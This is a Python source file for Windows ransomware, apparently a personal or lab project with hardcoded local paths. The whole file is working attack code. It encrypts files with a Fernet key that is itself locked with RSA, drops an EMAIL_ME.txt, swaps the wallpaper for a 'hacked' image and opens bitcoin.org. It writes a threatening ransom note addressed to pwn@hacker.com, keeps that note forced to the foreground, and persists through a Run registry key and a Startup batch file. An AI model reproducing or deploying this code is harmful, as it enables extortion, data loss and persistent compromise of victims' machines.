# Imports
from cryptography.fernet import Fernet 
import os 
import webbrowser 
import ctypes 
import urllib.request 
import requests 
import time 
import datetime 
import subprocess 
import win32gui 
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP
import base64
import threading 
import win32api
import win32con
import win32security
import win32evtlog
import winreg
import sys
import psutil
import time
import shutil
import platform



class RansomWare:

    
    
    file_exts = [
        'txt',
      

    ]


    def __init__(self):
        
        self.key = None
        self.crypter = None
        self.public_key = None
        self.sysRoot = os.path.expanduser('~')
        self.localRoot = r'C:\Users\Saad Hassan\Desktop\Ransomware\Python-Ransomware\localRoot' # Debugging/Testing

    def generate_key(self):
        self.key =  Fernet.generate_key()
        self.crypter = Fernet(self.key)

        with open('fernet_key.txt', 'wb') as f:
            f.write(self.key)

    def load_key(self):
        with open('fernet_key.txt', 'rb') as f:
            self.key = f.read()
            self.crypter = Fernet(self.key)  

    def generate_or_load_key(self):
        if os.path.exists('fernet_key.txt'):
            self.load_key()
        else:
            self.generate_key()              
 
    def write_key(self):
        with open('fernet_key.txt', 'wb') as f:
            f.write(self.key)

    def encrypt_fernet_key(self):
        with open('fernet_key.txt', 'rb') as fk:
            fernet_key = fk.read()
            self.public_key = RSA.import_key(open('public.pem').read())
            public_crypter = PKCS1_OAEP.new(self.public_key)
            enc_fernent_key = public_crypter.encrypt(fernet_key)
            with open('encrypted_fernet_key.txt', 'wb') as f:
                f.write(enc_fernent_key)
            with open(f'{self.sysRoot}\\Desktop\\EMAIL_ME.txt', 'wb') as fa:
                fa.write(enc_fernent_key)
            self.key = enc_fernent_key
            self.crypter = None

    def decrypt_fernet_key(self):
        with open('encrypted_fernet_key.txt', 'rb') as fk:
            encrypted_fernet_key = fk.read()
            private_key = RSA.import_key(open('private.pem').read())
            private_crypter = PKCS1_OAEP.new(private_key)
            fernet_key = private_crypter.decrypt(encrypted_fernet_key)
            with open('fernet_key.txt', 'wb') as f:
                f.write(fernet_key)
            self.key = fernet_key
            self.crypter = Fernet(self.key)



  
    def crypt_file(self, file_path, encrypted=False):
        with open(file_path, 'rb') as f:
            data = f.read()
            if not encrypted:
                print(data)
                _data = self.crypter.encrypt(data)
                print('> File encrpyted')
                print(_data)
            else:
                _data = self.crypter.decrypt(data)
                print('> File decrpyted')
                print(_data)
        with open(file_path, 'wb') as fp:
            fp.write(_data)
    
    encrypted_files_list = 'encrypted_files.txt' 

    def create_encrypted_files_list(self):
        if not os.path.exists(self.encrypted_files_list):
            open(self.encrypted_files_list, 'w').close()
    
    def should_stop_encryption(self):
        return os.path.exists('stop_encryption.flag')

    def add_to_encrypted_list(self, file_path):
        with open(self.encrypted_files_list, 'a') as f:
            f.write(file_path + '\n')

    def is_file_encrypted(self, file_path):
        with open(self.encrypted_files_list, 'r') as f:
            encrypted_files = f.read().splitlines()
            return file_path in encrypted_files

    def crypt_system(self, encrypted=False):
        if self.should_stop_encryption():
            print("Encryption stop flag found. Stopping encryption process.")
            return

        system = os.walk(self.localRoot, topdown=True)
        for root, dirs, files in system:
            for file in files:
                file_path = os.path.join(root, file)
                if not file.split('.')[-1] in self.file_exts:
                    continue
                if encrypted and self.is_file_encrypted(file_path):
                    print(f"Decrypting file: {file_path}")
                    self.crypt_file(file_path, encrypted=True)
                elif not self.is_file_encrypted(file_path):
                    print(f"Encrypting file: {file_path}")
                    self.crypt_file(file_path)
                    self.add_to_encrypted_list(file_path)
                else:
                    print(f"Skipping already encrypted file: {file_path}") 

    @staticmethod
    def what_is_bitcoin():
        url = 'https://bitcoin.org'
       
        webbrowser.open(url)


    def change_desktop_background(self):
        imageUrl = 'https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/f/2a6307b0-bf8c-4c90-9e5c-de4fc7922922/d7obwbx-9c4097f8-a958-4df2-b917-944be4aacc07.jpg/v1/fill/w_1024,h_576,q_75,strp/you_have_been_hacked_wallpaper_hd_by_psychobloodykiller_d7obwbx-fullview.jpg?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1cm46YXBwOjdlMGQxODg5ODIyNjQzNzNhNWYwZDQxNWVhMGQyNmUwIiwiaXNzIjoidXJuOmFwcDo3ZTBkMTg4OTgyMjY0MzczYTVmMGQ0MTVlYTBkMjZlMCIsIm9iaiI6W1t7ImhlaWdodCI6Ijw9NTc2IiwicGF0aCI6IlwvZlwvMmE2MzA3YjAtYmY4Yy00YzkwLTllNWMtZGU0ZmM3OTIyOTIyXC9kN29id2J4LTljNDA5N2Y4LWE5NTgtNGRmMi1iOTE3LTk0NGJlNGFhY2MwNy5qcGciLCJ3aWR0aCI6Ijw9MTAyNCJ9XV0sImF1ZCI6WyJ1cm46c2VydmljZTppbWFnZS5vcGVyYXRpb25zIl19.xDdfykxWJQ_l_ttcII_qbpF2DDHpcdzIZ9gAhfi-Hh4'
        # Go to specif url and download+save image using absolute path
        path = f'{self.sysRoot}\\Desktop\\background.png'
        urllib.request.urlretrieve(imageUrl, path)
        SPI_SETDESKWALLPAPER = 20
        # Access windows dlls for funcionality eg, changing dekstop wallpaper
        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, 0)


    def ransom_note(self):
        date = datetime.date.today().strftime('%d-%B-Y')
        with open('RANSOM_NOTE.txt', 'w') as f:
            f.write(f'''
The harddisks of your computer have been encrypted encryption algorithm.
There is no way to restore your data.
Only we can decrypt your files because only i have that key:)!

To purchase your key and restore your data, please follow instruction:

1. First you dont have to cancel this program if you have it again start by its own:) . 
                    
2. Email the file called EMAIL_ME.txt at {self.sysRoot}Desktop/EMAIL_ME.txt to pwn@hacker.com

3. you will receive phone call at that time you have to transfer all money in that account no.

4. You will receive a text file with your KEY that will unlock all your files. 
   IMPORTANT: To decrypt your files, place text file on desktop and wait. Shortly after it will begin to decrypt all files.

WARNING:
Do NOT attempt to decrypt your files with any software as it is obselete and will not work, and may cost you more to unlcok your files.
Do NOT change file names, mess with the files, or run deccryption software as it will cost you more to unlock your files-
-and there is a high chance you will lose your files forever.
Do NOT send "PAID" button without paying, price WILL go up for disobedience.
Do NOT think that we wont delete your files altogether and throw away the key if you refuse to pay. WE WILL.
''')


    def show_ransom_note(self):
        
        ransom = subprocess.Popen(['notepad.exe', 'RANSOM_NOTE.txt'])
        count = 0 # Debugging/Testing
        while True:
            time.sleep(0.1)
            top_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
            if top_window == 'RANSOM_NOTE - Notepad':
                print('Ransom note is the top window - do nothing') # Debugging/Testing
                pass
            else:
                print('Ransom note is not the top window - kill/create process again') # Debugging/Testing
              
                time.sleep(0.1)
                ransom.kill()
              
                time.sleep(0.1)
                ransom = subprocess.Popen(['notepad.exe', 'RANSOM_NOTE.txt'])
          
            time.sleep(5)
            count +=1 
            if count == 5:
                break                    
   


    
   
    def put_me_on_desktop(self):
        print('started') 
        while True:

            try:
                print('trying')
                with open(f'{self.sysRoot}\\Desktop\\PUT_ME_ON_DESKTOP.txt', 'r') as f:
                    self.decrypt_fernet_key()
                    self.crypt_system(encrypted=True)
                    print('decrypted')
                    break
            except Exception as e:
                print(e)
                pass
            time.sleep(5)
            print('Checking for PUT_ME_ON_DESKTOP.txt')          
             
    def add_to_startup(self, program_name, file_path):
        try:
            key = winreg.HKEY_CURRENT_USER
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            key = winreg.OpenKey(key, key_path, 0, winreg.KEY_ALL_ACCESS)
            winreg.SetValueEx(key, program_name, 0, winreg.REG_SZ, file_path)
            winreg.CloseKey(key)
            print(f"Added '{program_name}' to startup with path '{file_path}'")
        except Exception as e:
            print(f"Error adding to startup: {e}")

    def add_bat_to_startup(self, program_name, bat_content):
        
        startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
        
      
        bat_file_path = os.path.join(startup_folder, f"{program_name}.bat")
        
        
        try:
            with open(bat_file_path, "w") as bat_file:
                bat_file.write(bat_content)
            print(f"Added '{program_name}' to startup by creating the .bat file.")
        except Exception as e:
            print(f"Error adding .bat file to startup: {e}")   

def main():
   
    rw = RansomWare()
    rw.generate_or_load_key()
    rw.create_encrypted_files_list()
    rw.crypt_system()
    rw.write_key()
    rw.encrypt_fernet_key()
    rw.change_desktop_background()
    rw.what_is_bitcoin()
    rw.ransom_note()

    
   
    program_name = "MyRansomware"
    file_path = r"C:\Users\Saad Hassan\Desktop\Ransomware\Python-Ransomware\ransomware.py"
    rw.add_to_startup(program_name, file_path)
    
   
    bat_content = r"""@echo off
    cd "C:\\Users\\Saad Hassan\\Desktop\\Ransomware\\Python-Ransomware"
    python "ransomware.py"
    pause"""

    startup_folder = r'C:\Users\Saad Hassan\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'
    bat_file_path = os.path.join(startup_folder, 'MyBatFile.bat')
 
    with open(bat_file_path, 'w') as bat_file:
     bat_file.write(bat_content)


    t1 = threading.Thread(target=rw.show_ransom_note)
    t2 = threading.Thread(target=rw.put_me_on_desktop)

    
    t1.start()
    print('> RansomWare: Attack completed on target machine and system is encrypted') # Debugging/Testing
    print('> RansomWare: Waiting for attacker to give target machine document that will un-encrypt machine') 
   
 # Debugging/Testing
    t2.start()
    print('> RansomWare: Target machine has been un-encrypted') # Debugging/Testing
    print('> RansomWare: Completed') # Debugging/Testing
   

if __name__ == '__main__':
    main()
   
 
